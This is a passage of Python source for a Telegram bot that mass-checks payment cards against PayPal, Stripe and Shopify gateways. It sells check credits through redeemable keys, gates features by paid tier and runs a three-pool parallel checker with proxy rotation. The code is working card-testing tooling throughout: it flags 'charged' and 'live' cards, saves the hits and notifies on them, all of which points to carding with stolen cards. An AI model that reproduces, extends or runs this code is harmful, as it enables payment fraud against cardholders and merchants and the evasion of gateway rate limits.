            invalid_cards.append(card_str)
    
    if invalid_cards:
        print(f"⚠️ Invalid card formats: {invalid_cards}")
    
    if not cards:
        await update.message.reply_text("❌ No valid cards found. Make sure each card is in format: card|mm|yyyy|cvv")
        return
    
    tier = user_manager.get_tier(user_id)
    max_batch = user_manager.get_max_batch_size(user_id)
    
    if len(cards) > max_batch:
        await update.message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating to {max_batch}.")
        cards = cards[:max_batch]
    
    await payflow_mass_check_logic(update, context, cards)

# --- MAIN ---
async def pre_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check if this is a reply to a file before processing as command"""
    if update.message and update.message.reply_to_message:
        user_id = update.effective_user.id
        if user_id in pending_files:
            # This is a reply to a file, handle it
            await handle_reply_with_command(update, context)
            return True
    return False

# Then in main(), add this BEFORE all other handlers:
# ============ CREDIT SYSTEM COMMANDS ============

# Credit key storage
CREDIT_KEYS_FILE = "credit_keys.json"
credit_keys = {}  # key -> {amount, created_by, created_at, used_by, used_at, active}

def load_credit_keys():
    """Load credit keys from file"""
    global credit_keys
    if Path(CREDIT_KEYS_FILE).exists():
        try:
            with open(CREDIT_KEYS_FILE, 'r') as f:
                credit_keys = json.load(f)
            print(f"🔑 Loaded {len(credit_keys)} credit keys")
        except Exception as e:
            print(f"⚠️ Error loading credit keys: {e}")
            credit_keys = {}
    else:
        credit_keys = {}

def save_credit_keys():
    """Save credit keys to file"""
    try:
        with open(CREDIT_KEYS_FILE, 'w') as f:
            json.dump(credit_keys, f, indent=2)
    except Exception as e:
        print(f"⚠️ Error saving credit keys: {e}")

def generate_credit_key(amount: int, created_by: int, expiry_days: int = 30) -> str:
    """Generate a new credit key"""
    key = str(uuid.uuid4()).upper()[:16]
    key = '-'.join([key[i:i+4] for i in range(0, 16, 4)])
    
    expiry = (datetime.now() + timedelta(days=expiry_days)).timestamp() if expiry_days > 0 else 0
    
    credit_keys[key] = {
        "amount": amount,
        "created_by": created_by,
        "created_at": time.time(),
        "expiry": expiry,
        "used_by": None,
        "used_at": None,
        "active": True
    }
    save_credit_keys()
    return key

def redeem_credit_key(key: str, user_id: int) -> Tuple[bool, str, int]:
    """Redeem a credit key and return (success, message, credits_added)"""
    key = key.upper().strip()
    
    if key not in credit_keys:
        return False, "❌ Invalid credit key.", 0
    
    key_data = credit_keys[key]
    
    if not key_data.get("active", True):
        return False, "❌ This key has been deactivated.", 0
    
    if key_data.get("used_by") is not None:
        return False, "❌ This key has already been used.", 0
    
    # Check expiry
    if key_data.get("expiry", 0) > 0:
        if time.time() > key_data["expiry"]:
            key_data["active"] = False
            save_credit_keys()
            return False, "❌ This key has expired.", 0
    
    # Mark as used
    key_data["used_by"] = user_id
    key_data["used_at"] = time.time()
    key_data["active"] = False
    save_credit_keys()
    
    # Add credits to user
    amount = key_data["amount"]
    new_total = add_user_credits(user_id, amount)
    
    return True, f"✅ Successfully redeemed {amount} credits!", amount

async def credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user's credit balance"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    tier = user_manager.get_tier(user_id)
    chat = update.effective_chat
    
    if tier in ['premium', 'ultimate', 'admin']:
        msg = (
            f"💎 <b>Your Credit Status</b>\n\n"
            f"👑 Tier: {tier.upper()}\n"
            f"🎯 Credits: ∞ (Unlimited)\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"✨ You have unlimited access to all gateways!\n"
            f"💳 No credit deductions apply to your account.\n"
            f"🚀 Mass checks: ✅ Available"
        )
    else:
        credits = get_user_credits(user_id)
        msg = (
            f"💎 <b>Your Credit Status</b>\n\n"
            f"🎯 Tier: FREE\n"
            f"💳 Credits: {credits}\n"
            f"💸 Cost per check: {CREDITS_PER_CHECK} credit\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"📊 <b>Estimated checks remaining:</b> {credits // CREDITS_PER_CHECK}\n"
            f"📝 <b>Single check only</b> (mass check not available)\n\n"
            f"💡 <b>How to get more credits:</b>\n"
            f"• Use in group chats (FREE! No credits used)\n"
            f"• Redeem a credit key: /redeemcredits &lt;key&gt;\n"
            f"• Upgrade to Premium/Ultimate for unlimited\n"
            f"• Contact @Cypher099 to purchase\n\n"
            f"🔓 <b>Commands for free users:</b>\n"
            f"• /sh &lt;card&gt; - Shopify single check\n"
            f"• /chk &lt;card&gt; - Auto Stripe single check\n"
            f"• /auc &lt;card&gt; - Autosopi single check\n"
            f"• /credits - Check balance\n"
            f"• /redeemcredits &lt;key&gt; - Redeem credit key"
        )
    
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())

async def redeem_credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Redeem a credit key"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    
    # Check if user is free tier (only free users need credits)
    tier = user_manager.get_tier(user_id)
    if tier != 'free':
        await update.message.reply_text(
            f"❌ <b>Not Available for Paid Users</b>\n\n"
            f"Your tier ({tier.upper()}) has unlimited credits.\n"
            f"You don't need to redeem credit keys.",
            parse_mode=ParseMode.HTML
        )
        return
    
    if not context.args:
        await update.message.reply_text(
            "🎫 <b>Redeem Credit Key</b>\n\n"
            "Usage: /redeemcredits <key>\n"
            "Example: /redeemcredits XXXX-XXXX-XXXX-XXXX\n\n"
            "Redeem a key to add credits to your account.\n\n"
            f"Current credits: {get_user_credits(user_id)}",
            parse_mode=ParseMode.HTML
        )
        return
    
    key = context.args[0]
    success, message, amount = redeem_credit_key(key, user_id)
    
    if success:
        new_total = get_user_credits(user_id)
        await update.message.reply_text(
            f"✅ <b>Credit Key Redeemed!</b>\n\n"
            f"🎉 {message}\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"💰 Credits Added: {amount}\n"
            f"💎 New Balance: {new_total}\n"
            f"📊 Total Checks Available: {new_total // CREDITS_PER_CHECK}\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"Use /credits to check your balance anytime.",
            parse_mode=ParseMode.HTML
        )
    else:
        await update.message.reply_text(
            f"❌ {message}\n\n"
            f"Current credits: {get_user_credits(user_id)}",
            parse_mode=ParseMode.HTML
        )

async def gencreditkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate a credit key (admin only)"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    args = context.args
    if len(args) < 1 or len(args) > 2:
        await update.message.reply_text(
            "🎫 <b>Generate Credit Key</b>\n\n"
            "Usage: /gencreditkey <amount> [days]\n"
            "Amount: number of credits (e.g., 100, 500, 1000)\n"
            "Days: expiry days (default: 30, 0 for never)\n\n"
            "Examples:\n"
            "<code>/gencreditkey 100</code> - 100 credits, expires in 30 days\n"
            "<code>/gencreditkey 500 7</code> - 500 credits, expires in 7 days\n"
            "<code>/gencreditkey 1000 0</code> - 1000 credits, never expires\n\n"
            "Users can redeem with: /redeemcredits &lt;key&gt;",
            parse_mode=ParseMode.HTML
        )
        return
    
    try:
        amount = int(args[0])
        if amount <= 0:
            await update.message.reply_text("❌ Amount must be positive.")
            return
        
        expiry_days = 30
        if len(args) >= 2:
            expiry_days = int(args[1])
            if expiry_days < 0:
                await update.message.reply_text("❌ Days cannot be negative.")
                return
        
        key = generate_credit_key(amount, update.effective_user.id, expiry_days)
        
        expiry_text = f"{expiry_days} days" if expiry_days > 0 else "Never"
        expiry_date = (datetime.now() + timedelta(days=expiry_days)).strftime("%Y-%m-%d %H:%M") if expiry_days > 0 else "Never"
        
        await update.message.reply_text(
            f"✅ <b>Credit Key Generated!</b>\n\n"
            f"🔑 Key: <code>{key}</code>\n"
            f"💰 Amount: {amount} credits\n"
            f"⏱️ Expires: {expiry_text}\n"
            f"📅 Valid until: {expiry_date}\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"User can redeem with:\n"
            f"<code>/redeemcredits {key}</code>\n\n"
            f"<i>Each credit = 1 single card check for free users</i>",
            parse_mode=ParseMode.HTML
        )
        
    except ValueError:
        await update.message.reply_text("❌ Invalid amount or days. Use numbers only.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def bulkgencredit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate multiple credit keys (admin only)"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    args = context.args
    if len(args) < 2 or len(args) > 3:
        await update.message.reply_text(
            "🎫 <b>Bulk Generate Credit Keys</b>\n\n"
            "Usage: /bulkgencredit <amount> <count> [days]\n"
            "Amount: number of credits per key (e.g., 100)\n"
            "Count: number of keys to generate (max 50)\n"
            "Days: expiry days (default: 30, 0 for never)\n\n"
            "Example: /bulkgencredit 100 10 30\n"
            "Generates 10 keys, each with 100 credits, expires in 30 days",
            parse_mode=ParseMode.HTML
        )
        return
    
    try:
        amount = int(args[0])
        count = int(args[1])
        expiry_days = 30
        if len(args) >= 3:
            expiry_days = int(args[2])
        
        if amount <= 0:
            await update.message.reply_text("❌ Amount must be positive.")
            return
        
        if count < 1 or count > 50:
            await update.message.reply_text("❌ Count must be between 1 and 50.")
            return
        
        if expiry_days < 0:
            await update.message.reply_text("❌ Days cannot be negative.")
            return
        
        keys = []
        for i in range(count):
            key = generate_credit_key(amount, update.effective_user.id, expiry_days)
            keys.append(key)
            await asyncio.sleep(0.1)
        
        expiry_text = f"{expiry_days} days" if expiry_days > 0 else "Never"
        
        keys_text = ""
        for i, k in enumerate(keys, 1):
            keys_text += f"{i}. <code>{k}</code>\n"
        
        await update.message.reply_text(
            f"✅ <b>{count} Credit Keys Generated!</b>\n\n"
            f"💰 Each Key: {amount} credits\n"
            f"⏱️ Expires: {expiry_text}\n"
            f"━━━━━━━━━━━━━━━━━━━\n\n"
            f"{keys_text}\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"Users can redeem with: <code>/redeemcredits &lt;key&gt;</code>\n\n"
            f"<i>Total credits generated: {amount * count}</i>",
            parse_mode=ParseMode.HTML
        )
        
        # Also send plain text for easy copying
        plain_keys = "\n".join(keys)
        await update.message.reply_text(
            f"📋 Keys (plain text):\n\n{plain_keys}",
            parse_mode=None
        )
        
    except ValueError:
        await update.message.reply_text("❌ Invalid number format.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def listcreditkeys_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all credit keys (admin only)"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    if not credit_keys:
        await update.message.reply_text("📋 No credit keys found.")
        return
    
    # Clean expired keys
    current_time = time.time()
    expired_count = 0
    for key, data in list(credit_keys.items()):
        if data.get("expiry", 0) > 0 and current_time > data["expiry"] and not data.get("used_by"):
            data["active"] = False
            expired_count += 1
    if expired_count > 0:
        save_credit_keys()
    
    total_keys = len(credit_keys)
    active_keys = sum(1 for k in credit_keys.values() if k.get("active", True) and not k.get("used_by"))
    used_keys = sum(1 for k in credit_keys.values() if k.get("used_by"))
    expired_keys = sum(1 for k in credit_keys.values() if not k.get("active", True) and not k.get("used_by"))
    
    msg = f"🎫 <b>Credit Keys</b>\n\n"
    msg += f"📊 Total: {total_keys}\n"
    msg += f"✅ Active: {active_keys}\n"
    msg += f"🔴 Used: {used_keys}\n"
    msg += f"⚠️ Expired: {expired_keys}\n"
    msg += f"━━━━━━━━━━━━━━━━━━━\n\n"
    
    # Show recent keys (last 10)
    recent_keys = sorted(credit_keys.items(), key=lambda x: x[1]["created_at"], reverse=True)[:10]
    
    for key, data in recent_keys:
        status = "✅" if data.get("active") and not data.get("used_by") else "🔴" if data.get("used_by") else "⚠️"
        used_by = f"Used by: {data['used_by']}" if data.get("used_by") else "Available"
        created = datetime.fromtimestamp(data["created_at"]).strftime("%Y-%m-%d")
        expiry = datetime.fromtimestamp(data["expiry"]).strftime("%Y-%m-%d") if data.get("expiry", 0) > 0 else "Never"
        
        msg += f"{status} <code>{key}</code>\n"
        msg += f"  💰 {data['amount']} credits | 📅 {created}\n"
        msg += f"  🎯 {used_by} | ⏱️ Expires: {expiry}\n\n"
    
    if total_keys > 10:
        msg += f"... and {total_keys - 10} more keys"
    
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())

async def deletecreditkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Delete/deactivate a credit key (admin only)"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    if not context.args:
        await update.message.reply_text(
            "Usage: /deletecreditkey <key>\n"
            "Example: /deletecreditkey XXXX-XXXX-XXXX-XXXX"
        )
        return
    
    key = context.args[0].upper().strip()
    
    if key not in credit_keys:
        await update.message.reply_text("❌ Key not found.")
        return
    
    if credit_keys[key].get("used_by"):
        await update.message.reply_text(f"❌ Cannot delete. Key was already used by user {credit_keys[key]['used_by']}.")
        return
    
    # Deactivate the key
    credit_keys[key]["active"] = False
    save_credit_keys()
    
    await update.message.reply_text(f"✅ Key {key} has been deactivated.")
    
# ============ PAYPAL 3-POOL PROCESSING SYSTEM ============
# Add this after your existing code, before the main() function

class ProcessingPool:
    """
    Processing pool for parallel card checking
    Each pool runs independently with its own rate limiting and proxy rotation
    """
    
    def __init__(self, pool_id: int, worker_count: int = 5, delay: float = 0.5):
        self.pool_id = pool_id
        self.worker_count = worker_count
        self.delay = delay
        self.active_tasks = []
        self.completed_count = 0
        self.results = []
        self.is_busy = False
        self.speed_controller = None  # Will be set per user
        self.current_proxy_index = 0
        self.proxies = []  # Per-pool proxy rotation
        
    async def process_card(self, card: str, user_id: int, amount: str, currency: str, context) -> Dict:
        """Process a single card in this pool"""
        try:
            # Get proxy for this pool (rotating)
            proxy_str = None
            if self.proxies:
                proxy_str = self.proxies[self.current_proxy_index % len(self.proxies)]
                self.current_proxy_index += 1
            
            # Apply rate limiting for this pool
            if self.speed_controller:
                await self.speed_controller.wait_if_needed()
            
            # Check the card
            result = await check_card_paypal(card, amount, currency, proxy_str, user_id)
            
            return result, card
        except Exception as e:
            return {"status": "error", "message": str(e)}, card
    
    def set_proxies(self, proxies: list):
        """Set proxies for this pool"""
        self.proxies = proxies
        self.current_proxy_index = 0

class PayPalThreePoolManager:
    """
    Manages 3 parallel processing pools for PayPal gateway
    Cards are distributed evenly across pools for maximum throughput
    """
    
    def __init__(self):
        # Three processing pools
        self.pools = {
            1: ProcessingPool(pool_id=1, worker_count=8, delay=0.3),   # Fast pool
            2: ProcessingPool(pool_id=2, worker_count=8, delay=0.3),   # Fast pool
            3: ProcessingPool(pool_id=3, worker_count=8, delay=0.3),   # Fast pool
        }
        
        # Pool rotation for load balancing
        self.current_pool_index = 1
        self.pool_assignment_counts = {1: 0, 2: 0, 3: 0}
        
        # Statistics
        self.stats = {
            'total_processed': 0,
            'cards_per_pool': {1: 0, 2: 0, 3: 0},
            'avg_time_per_pool': {1: 0, 2: 0, 3: 0},
            'total_time': 0
        }
        
        # Per-user pool configurations
        self.user_pool_configs = {}  # user_id -> {pool1_proxies, pool2_proxies, pool3_proxies}
        
    def configure_user_pools(self, user_id: int, proxies: list = None):
        """
        Configure proxy pools for a specific user
        If proxies provided, distributes them across 3 pools
        """
        if proxies and len(proxies) >= 3:
            # Distribute proxies across 3 pools
            pool_size = len(proxies) // 3
            pool1_proxies = proxies[:pool_size]
            pool2_proxies = proxies[pool_size:pool_size*2]
            pool3_proxies = proxies[pool_size*2:]
            
            # Ensure each pool has at least 1 proxy
            if not pool1_proxies and proxies:
                pool1_proxies = [proxies[0]]
            if not pool2_proxies and len(proxies) > 1:
                pool2_proxies = [proxies[1]]
            if not pool3_proxies and len(proxies) > 2:
                pool3_proxies = [proxies[2]]
            
            self.pools[1].set_proxies(pool1_proxies)
            self.pools[2].set_proxies(pool2_proxies)
            self.pools[3].set_proxies(pool3_proxies)
            
            self.user_pool_configs[user_id] = {
                'pool1': len(pool1_proxies),
                'pool2': len(pool2_proxies),
                'pool3': len(pool3_proxies)
            }
            
            print(f"📊 User {user_id} pool config: P1:{len(pool1_proxies)} proxies, P2:{len(pool2_proxies)}, P3:{len(pool3_proxies)}")
        else:
            # No proxies provided, use direct connections for all pools
            self.pools[1].set_proxies([])
            self.pools[2].set_proxies([])
            self.pools[3].set_proxies([])
    
    def set_user_speed_controller(self, user_id: int, speed_controller):
        """Set speed controller for all pools"""
        for pool in self.pools.values():
            pool.speed_controller = speed_controller
    
    async def process_cards_parallel(self, update: Update, context: ContextTypes.DEFAULT_TYPE, 
                                      cards: list, amount: str, currency: str) -> Dict:
        """
        Process cards using 3 parallel pools with round-robin distribution
        """
        user_id = update.effective_user.id
        message = update.effective_message
        total_cards = len(cards)
        
        print(f"\n{'='*80}")
        print(f"🚀 [3-POOL SYSTEM] Starting for user {user_id}")
        print(f"📊 Total cards: {total_cards}")
        print(f"🎯 Distribution: Round-robin across 3 pools")
        print(f"{'='*80}")
        
        # Statistics
        stats = {
            'charged': 0,
            'approved': 0,
            'declined': 0,
            'errors': 0,
            'total': total_cards,
            'processed': 0,
            'pool_stats': {1: {'cards': 0, 'charged': 0, 'approved': 0, 'declined': 0, 'errors': 0},
                           2: {'cards': 0, 'charged': 0, 'approved': 0, 'declined': 0, 'errors': 0},
                           3: {'cards': 0, 'charged': 0, 'approved': 0, 'declined': 0, 'errors': 0}}
        }
        
        start_time = time.time()
        
        # Distribute cards to pools using round-robin
        pool_cards = {1: [], 2: [], 3: []}
        for i, card in enumerate(cards):
            pool_id = (i % 3) + 1  # Round-robin: 1,2,3,1,2,3...
            pool_cards[pool_id].append(card)
        
        print(f"📦 Card distribution:")
        for pool_id in [1, 2, 3]:
            print(f"   Pool {pool_id}: {len(pool_cards[pool_id])} cards")
        
        # Create progress message
        progress_msg = await message.reply_text(
            f"⚡ <b>3-POOL PARALLEL PROCESSING ACTIVE</b>\n\n"
            f"📝 Total Cards: {total_cards}\n"
            f"🔀 Distribution:\n"
            f"   ├─ Pool 1: {len(pool_cards[1])} cards\n"
            f"   ├─ Pool 2: {len(pool_cards[2])} cards\n"
            f"   └─ Pool 3: {len(pool_cards[3])} cards\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"🔄 Starting parallel processing...\n"
            f"📊 Results will appear as they're found",
            parse_mode=ParseMode.HTML,
            reply_markup=create_progress_buttons(0, total_cards, 0, 0, "", "Starting 3 pools...")
        )
        
        # Process each pool's cards
        all_tasks = []
        
        for pool_id, pool_cards_list in pool_cards.items():
            if not pool_cards_list:
                continue
            
            pool = self.pools[pool_id]
            
            async def process_pool_cards(pool_id, cards_list):
                pool = self.pools[pool_id]
                pool_results = []
                processed = 0
                
                for i, card in enumerate(cards_list, 1):
                    # Update progress every 5 cards
                    if i % 5 == 0 or i == len(cards_list):
                        async with asyncio.Lock():
                            stats['processed'] = sum(len(pool_cards[p]) for p in [1,2,3] if p != pool_id) + i
                            progress = int((stats['processed'] / total_cards) * 10)
                            bar = "▓" * progress + "░" * (10 - progress)
                            
                            try:
                                await progress_msg.edit_text(
                                    f"⚡ <b>3-POOL PARALLEL PROCESSING</b>\n\n"
                                    f"📊 Progress: {stats['processed']}/{total_cards} {bar}\n"
                                    f"━━━━━━━━━━━━━━━━━━━\n"
                                    f"Pool 1: {stats['pool_stats'][1]['cards']} cards | ✅ {stats['pool_stats'][1]['charged']+stats['pool_stats'][1]['approved']}\n"
                                    f"Pool 2: {stats['pool_stats'][2]['cards']} cards | ✅ {stats['pool_stats'][2]['charged']+stats['pool_stats'][2]['approved']}\n"
                                    f"Pool 3: {stats['pool_stats'][3]['cards']} cards | ✅ {stats['pool_stats'][3]['charged']+stats['pool_stats'][3]['approved']}\n"
                                    f"━━━━━━━━━━━━━━━━━━━\n"
                                    f"🔥 Hits: {stats['charged']} | ✅ Live: {stats['approved']}\n"
                                    f"⏱️ Time: {int(time.time() - start_time)}s",
                                    parse_mode=ParseMode.HTML,
                                    reply_markup=stop_markup(user_id)
                                )
                            except:
                                pass
                    
                    # Process card in this pool
                    result, card = await pool.process_card(card, user_id, amount, currency, context)
                    
                    # Update pool stats
                    async with asyncio.Lock():
                        stats['pool_stats'][pool_id]['cards'] += 1
                        processed += 1
                    
                    # Get BIN info
                    bin_info = await get_bin_info(card)
                    
                    # Determine result type
                    if result and result.get('status') == 'success':
                        result_text = result.get('result', '')
                        message_text = result.get('message', '')
                        response_upper = f"{result_text} {message_text}".upper()
                        
                        if any(x in response_upper for x in ["CHARGE 2$", "CHARGED", "ORDER COMPLETED", "PAID"]):
                            stats['charged'] += 1
                            stats['pool_stats'][pool_id]['charged'] += 1
                            
                            ui, _ = format_paypal_response(result, card, bin_info, amount)
                            await message.reply_text(ui, parse_mode=ParseMode.HTML)
                            
                            # Save hit
                            await save_hit_to_file(
                                card=card, gateway="PayPal (3-Pool)",
                                response=message_text, price=f"${amount}",
                                bin_info=bin_info, user_id=user_id,
                                user_tier=user_manager.get_tier(user_id)
                            )
                            
                            # Send notification
                            user_data = user_manager.get_user(user_id)
                            await send_hit_notification(
                                context=context, gateway="PayPal (3-Pool)",
                                card=card, response=message_text,
                                price=f"${amount}", user=user_data,
                                bin_info=bin_info, status_category="charged"
                            )
                            
                            user_manager.increment_hits(user_id)
                            
                        elif any(x in response_upper for x in ["CVV LIVE", "APPROVED CCN", "EXISTING_ACCOUNT_RESTRICTED"]):
                            stats['approved'] += 1
                            stats['pool_stats'][pool_id]['approved'] += 1
                            
                            ui, _ = format_paypal_response(result, card, bin_info, amount)
                            await message.reply_text(ui, parse_mode=ParseMode.HTML)
                            
                            await save_hit_to_file(
                                card=card, gateway="PayPal (3-Pool)",
                                response=message_text, price=f"${amount}",
                                bin_info=bin_info, user_id=user_id,
                                user_tier=user_manager.get_tier(user_id)
                            )
                            
                        else:
                            stats['declined'] += 1
                            stats['pool_stats'][pool_id]['declined'] += 1
                    else:
                        stats['errors'] += 1
                        stats['pool_stats'][pool_id]['errors'] += 1
                    
                    user_manager.increment_checks(user_id, 1)
                    
                    # Small delay between cards in same pool
                    if i < len(cards_list):
                        await asyncio.sleep(pool.delay)
                
                return pool_results
            
            # Create task for this pool
            task = asyncio.create_task(process_pool_cards(pool_id, pool_cards_list))
            all_tasks.append(task)
        
        # Wait for all pools to complete
        await asyncio.gather(*all_tasks, return_exceptions=True)
        
        # Final summary
        total_time = time.time() - start_time
        minutes = int(total_time // 60)
        seconds = int(total_time % 60)
        cards_per_second = total_cards / total_time if total_time > 0 else 0
        
        # Calculate pool speeds
        pool_speeds = {}
        for pool_id in [1, 2, 3]:
            pool_cards_count = stats['pool_stats'][pool_id]['cards']
            if pool_cards_count > 0:
                pool_time = total_time  # Rough estimate
                pool_speeds[pool_id] = pool_cards_count / pool_time
        
        summary = (
            f"🏁 <b>3-POOL PROCESSING COMPLETE</b>\n\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"🔥 Charged/Hits: {stats['charged']}\n"
            f"✅ Live (CVV/3D): {stats['approved']}\n"
            f"❌ Declined: {stats['declined']}\n"
            f"⚠️ Errors: {stats['errors']}\n"
            f"📝 Total: {stats['total']}\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"📊 <b>Pool Performance:</b>\n"
            f"   Pool 1: {stats['pool_stats'][1]['cards']} cards | {stats['pool_stats'][1]['charged']+stats['pool_stats'][1]['approved']} hits\n"
            f"   Pool 2: {stats['pool_stats'][2]['cards']} cards | {stats['pool_stats'][2]['charged']+stats['pool_stats'][2]['approved']} hits\n"
            f"   Pool 3: {stats['pool_stats'][3]['cards']} cards | {stats['pool_stats'][3]['charged']+stats['pool_stats'][3]['approved']} hits\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"⚡ Speed: {cards_per_second:.1f} cards/sec ({cards_per_second*60:.0f} cards/min)\n"
            f"⏱️ Time: {minutes}m {seconds}s"
        )
        
        await progress_msg.edit_text(summary, parse_mode=ParseMode.HTML)
        
        return stats
    
    def get_pool_status(self) -> str:
        """Get formatted status of all pools"""
        status = f"📊 <b>3-Pool System Status</b>\n\n"
        
        for pool_id in [1, 2, 3]:
            pool = self.pools[pool_id]
            proxies_count = len(pool.proxies)
            status += f"🔵 <b>Pool {pool_id}</b>\n"
            status += f"   ├─ Workers: {pool.worker_count}\n"
            status += f"   ├─ Delay: {pool.delay}s\n"
            status += f"   └─ Proxies: {proxies_count}\n\n"
        
        return status


# Create global instance
paypal_3pool_manager = PayPalThreePoolManager()


# ============ NEW MASS CHECK WITH 3-POOL SYSTEM ============

async def mass_check_paypal_3pool(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Mass card check with PayPal gateway using 3 parallel pools
    Command: /mpp3 <cards> or /pp3mass <cards>
    """
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    message = update.effective_message
    
    if not context.args:
        await message.reply_text(
            "🚀 <b>PayPal 3-Pool Mass Check</b>\n\n"
            "Usage: <code>/mpp3 &lt;card1&gt; &lt;card2&gt; ...</code>\n\n"
            "Examples:\n"
            "<code>/mpp3 4111111111111111|12|2025|123 4222222222222222|11|2026|456</code>\n\n"
            "<b>⚡ 3-Pool System Features:</b>\n"
            "• Cards distributed evenly across 3 pools\n"
            "• Each pool runs in parallel\n"
            "• 3x faster than standard mass check\n"
            "• Automatic load balancing\n"
            "• Per-pool proxy rotation\n\n"
            "💡 <b>Speed Comparison:</b>\n"
            "• Standard: ~1 card/sec\n"
            "• 3-Pool: ~3 cards/sec\n\n"
            "Use /poolstatus to see current pool configuration",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check user access
    if not user_manager.can_access_gateway(user_id, 'paypal'):
        await message.reply_text("❌ Your tier doesn't have access to PayPal gateway.")
        return
    
    # Check if user can mass check
    if not user_manager.can_mass_check(user_id):
        tier = user_manager.get_tier(user_id)
        await message.reply_text(
            f"❌ <b>Mass Check Not Available for {tier.upper()} Tier</b>\n\n"
            f"Your tier ({tier.upper()}) only supports single card checks.\n\n"
            f"Use <code>/pp &lt;card&gt;</code> for single checks.\n\n"
            f"💎 Upgrade to Premium/Ultimate for 3-pool mass checking.",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Extract cards
    cards_text = " ".join(context.args)
    card_strings = cards_text.split()
    
    cards = []
    invalid_cards = []
    
    for card_str in card_strings:
        card = card_formatter.extract_single_card_from_text(card_str)
        if card:
            cards.append(card)
        else:
            invalid_cards.append(card_str[:30])
    
    if invalid_cards:
        await message.reply_text(
            f"⚠️ Found {len(invalid_cards)} invalid card(s). They will be skipped.\n"
            f"First invalid: {invalid_cards[0]}..."
        )
    
    if not cards:
        await message.reply_text("❌ No valid cards found. Make sure each card is in format: card|mm|yyyy|cvv")
        return
    
    # Check batch size limit
    tier = user_manager.get_tier(user_id)
    max_batch = user_manager.get_max_batch_size(user_id)
    if len(cards) > max_batch:
        await message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating to {max_batch}.")
        cards = cards[:max_batch]
    
    # Get user's proxies and configure pools
    user_proxies = proxy_manager.get_user_proxies(user_id)
    if user_proxies:
        paypal_3pool_manager.configure_user_pools(user_id, user_proxies)
        proxy_msg = f"✅ Using {len(user_proxies)} personal proxies across 3 pools"
    else:
        paypal_3pool_manager.configure_user_pools(user_id, [])
        proxy_msg = "⚠️ No proxies - using direct connections"
    
    # Get amount
    amount = context.user_data.get('payment_amount', DEFAULT_AMOUNT)
    currency = context.user_data.get('payment_currency', DEFAULT_CURRENCY)
    
    # Send initial message
    await message.reply_text(
        f"🚀 <b>3-POOL PARALLEL PROCESSING STARTING</b>\n\n"
        f"📝 Cards: {len(cards)}\n"
        f"💰 Amount: ${amount}\n"
        f"🎯 Tier: {tier.upper()}\n"
        f"🔀 Distribution: Round-robin to 3 pools\n"
        f"{proxy_msg}\n\n"
        f"⚡ <b>Expected Speed:</b> ~{len(cards) // 3} cards per pool\n"
        f"🔄 Starting...",
        parse_mode=ParseMode.HTML
    )
    
    # Set speed controller
    if user_id not in user_speed_controllers:
        user_speed_controllers[user_id] = SpeedController(TIER_SPEEDS.get(tier, 900) * 3, tier)  # 3x speed for 3 pools
    paypal_3pool_manager.set_user_speed_controller(user_id, user_speed_controllers[user_id])
    
    # Process with 3 pools
    await paypal_3pool_manager.process_cards_parallel(update, context, cards, amount, currency)


async def pool_status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show status of 3-pool system"""
    if not await verify_group_access(update, context):
        return
    
    status = paypal_3pool_manager.get_pool_status()
    await update.message.reply_text(status, parse_mode=ParseMode.HTML, reply_markup=back_menu())


async def add_to_pool_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add a proxy to a specific pool (admin only)"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    if len(context.args) < 2:
        await update.message.reply_text(
            "Usage: /addtopool <pool> <proxy>\n"
            "Pool: 1, 2, or 3\n"
            "Example: /addtopool 1 user:pass@ip:port"
        )
        return
    
    try:
        pool_id = int(context.args[0])
        if pool_id not in [1, 2, 3]:
            await update.message.reply_text("❌ Pool must be 1, 2, or 3")
            return
        
        proxy = " ".join(context.args[1:])
        
        if paypal_3pool_manager.pools[pool_id].add_proxy(proxy):
            await update.message.reply_text(f"✅ Proxy added to Pool {pool_id}")
        else:
            await update.message.reply_text("❌ Invalid proxy format or already exists")
    except ValueError:
        await update.message.reply_text("❌ Invalid pool number")

    
async def single_check_stripe_charge_new(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Single card check with Stripe Charge gateway - /stc <card>"""
    if not await verify_group_access(update, context):
        return
    
    if not context.args:
        await update.message.reply_text(
            "💳 <b>Stripe Charge Single Check</b>\n\n"
